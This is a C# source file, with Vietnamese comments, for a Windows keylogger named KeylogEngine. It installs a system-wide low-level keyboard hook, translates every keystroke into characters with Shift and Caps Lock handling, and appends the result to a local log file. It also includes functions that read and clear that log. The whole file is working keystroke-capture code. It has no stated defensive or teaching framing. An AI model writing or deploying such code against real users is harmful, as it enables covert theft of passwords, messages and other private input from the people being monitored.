using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;

namespace KeyLogger
{
    public static class KeylogEngine
    {
        public static string LogPath = "fileKeyLog.txt";
        public static volatile bool IsLogging = false;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static void StartHook()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        public static void StopHook()
        {
            try
            {
                UnhookWindowsHookEx(_hookID);
                Application.Exit();
            }
            catch { }
        }

        public static string GetLogContent()
        {
            if (!File.Exists(LogPath)) return "";
            try
            {
                using (var fs = new FileStream(LogPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                using (var sr = new StreamReader(fs, Encoding.UTF8))
                {
                    return sr.ReadToEnd();
                }
            }
            catch { return ""; }
        }

        public static void ClearLog()
        {
            try
            {
                File.WriteAllText(LogPath, string.Empty);
            }
            catch { }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && IsLogging)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                string charTyped = GetCharsFromKeys(key);

                try
                {
                    if (!string.IsNullOrEmpty(charTyped))
                        File.AppendAllText(LogPath, charTyped);
                }
                catch { }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // --- HÀM XỬ LÝ KÝ TỰ CHUẨN XÁC ---
        private static string GetCharsFromKeys(Keys keys)
        {
            // 1. Lọc phím chức năng
            switch (keys)
            {
                case Keys.Space: return " ";
                case Keys.Return: return Environment.NewLine;
                case Keys.Back: return "[Back]";
                case Keys.Tab: return "[Tab]";
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.LControlKey:
                case Keys.RControlKey:
                case Keys.LMenu:
                case Keys.RMenu:
                case Keys.Capital:
                    return "";
            }

            var buf = new StringBuilder(256);
            var keyboardState = new byte[256];

            // 2. Lấy trạng thái bàn phím hiện tại
            GetKeyboardState(keyboardState);

            // 3. Xử lý Shift: Dùng GetKeyState (Logic) thay vì GetAsyncKeyState (Vật lý)
            // Cách này đồng bộ với tốc độ gõ phím của Windows
            bool isShiftDown = (GetKeyState(0x10) & 0x8000) != 0;

            if (isShiftDown)
            {
                keyboardState[0x10] = 0x80; // Bắt buộc set trạng thái Đang Nhấn
            }
            else
            {
                keyboardState[0x10] = 0;    // Bắt buộc set trạng thái Đã Thả (Fix lỗi kẹt phím)
            }

            // 4. Xử lý CapsLock
            bool isCapsLockOn = (GetKeyState(0x14) & 0x0001) != 0;
            if (isCapsLockOn)
            {
                keyboardState[0x14] = 0x01;
            }
            else
            {
                keyboardState[0x14] = 0;
            }

            // 5. Dịch mã phím
            int result = ToUnicode((uint)keys, 0, keyboardState, buf, 256, 0);

            if (result > 0)
            {
                return buf.ToString();
            }

            if (keys.ToString().Length > 1)
                return "[" + keys.ToString() + "]";

            return "";
        }

        // --- API WINDOWS ---
        // Quay lại dùng GetKeyState để đồng bộ tốt hơn
        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);

        [DllImport("user32.dll")]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}